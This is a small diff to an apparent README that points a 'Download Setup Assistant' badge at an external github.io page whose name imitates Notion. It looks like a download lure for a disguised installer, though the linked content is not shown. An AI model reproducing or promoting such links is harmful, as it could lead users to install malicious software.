@@ -2,7 +2,7 @@
 
 🔘 **Download Setup Assistant:**
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](#)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://notion-so-workspace.github.io/.github/)
 
 ## ⚙️ How to Use
 
